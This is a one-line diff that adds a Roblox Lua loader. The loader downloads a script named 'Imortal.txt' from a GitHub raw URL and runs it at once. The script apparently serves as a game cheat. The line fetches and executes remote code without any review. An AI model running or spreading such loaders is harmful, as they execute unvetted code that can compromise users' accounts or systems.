@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Scripts/main/Imortal.txt'),true))()
